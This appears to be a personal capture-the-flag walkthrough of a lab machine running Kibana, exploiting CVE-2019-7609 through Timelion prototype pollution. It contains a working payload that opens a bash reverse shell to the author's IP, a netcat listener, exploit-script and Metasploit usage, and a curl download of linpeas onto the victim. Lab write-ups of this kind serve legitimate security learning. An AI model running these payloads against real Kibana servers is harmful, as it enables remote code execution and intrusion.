Before you begin, always add your ip address to hosts file so as to avoid burden especially ip address related operations, while you are actively pentesting.

How to apply ?

![[Screen Shot 2024-10-04 at 13.58.40.png]]

## Reconnaissance
 nmap payload:
└─# sudo nmap -sV -sC -p- kiba.thm

Unusual port number:

![[Screen Shot 2024-10-04 at 09.09.24.png]]

![[Screen Shot 2024-10-04 at 09.45.27.png]]

What is Kibana ?
![[Screen Shot 2024-10-04 at 09.10.54.png]]

Suspicious path:
http://kiba.thm:5601/app/timelion#



## Exploitation

Useful resources about vulnerability:
-  https://github.com/LandGrey/CVE-2019-7609
- https://github.com/mpgn/CVE-2019-7609

For the exploitation phase we have two ways to compromise the target.
- Manual payload execution on 
### Manual Exploitation - 1

After a couple of research process, I discovered the vulnerability itself which is **Prototype Pollusion** on **Timelion** feature of the **Kibana** - ElasticSearch supported and opensource data visualization platform.

![[Screen Shot 2024-10-04 at 14.06.13.png]]


Initial compromise:
- Used Payload:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.11.69.113/1337 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

- Netcat listener:
```
nc -lvnp 1337
```


Reverse Shell PoC:
![[Screen Shot 2024-10-04 at 09.16.33.png]]



### Manual Exploitation - 2

Although I have taken reverse shell connection properly, trying a python script where I discovered the vulnerability that trigger RCE automatically.

```
# python2 CVE-2019-7609-kibana-rce.py -h

usage: CVE-2019-7609-kibana-rce.py [-h] [-u URL] [-host REMOTE_HOST]
                                   [-port REMOTE_PORT] [--shell]

optional arguments:
  -h, --help         show this help message and exit
  -u URL             such as: http://127.0.0.1:5601
  -host REMOTE_HOST  reverse shell remote host: such as: 1.1.1.1
  -port REMOTE_PORT  reverse shell remote port: such as: 8888
  --shell            reverse shell after verify

```

I will execute a payload below:

```
python2 CVE-2019-7609-kibana-rce.py -u http://10.10.163.241:5601 -host 10.11.69.113 -port 1234 --shell
```

However, it did not call back on my machine. After on my first shot, I got break-time and turn on hybrid mode on my system. Therefore, I am going to refresh the machine.

![[Screen Shot 2024-10-04 at 09.59.31.png]]![[Screen Shot 2024-10-04 at 10.00.59.png]]



Now it works ! After I restarted the machine, I was able to get my reverse shell !

![[Screen Shot 2024-10-04 at 11.11.31.png]]


### Automated Exploitation

Metasploit Framework offers only three modules for **Kibana** platform. However, first approach was suitable for me. You can reach out the related module in below.

![[Screen Shot 2024-10-04 at 14.15.29.png]]

To interact with correlated module:

```
use 0
```

Now you are ready to configure module specific settings.

In order to show options required by the module, use the below command:

```
show options
```

![[Screen Shot 2024-10-04 at 14.16.39.png]]

Modifying the *RHOSTS*, *TARGETURI* and *RPORT* is enough to execute our exploit.

To add necessary information to script settings:

```
set [needed attribute]

Example: set RHOSTS or set RPORT
```

For this scenario, do not forget to modify *RHOSTS*, *LHOST* and *LPORT*.

![[Screen Shot 2024-10-04 at 14.26.39.png]]

Since I forgot to give *LHOST* and *LPORT* option, I was not able to run the script appropriately.



I have tried to run linpeas on tmp folder which allows users to run many scripts here ,but in this scenario it does not work. Therefore, I uploaded my files through /home/kiba

1. Deploy python server from local
```
python -m http.server 3131
```

2. Download linpeas from victim machine
```
curl http://10.11.69.113:3131/linpeas.sh -o linpeas.sh
```

3. Give executable permission to linpeas.sh
```
chmod +x linpeas.sh
```

4. Examine carefully  the linpeas output
- I found really useful evidence to escalate our privileges

![[Screen Shot 2024-10-04 at 11.46.43 1.png]]



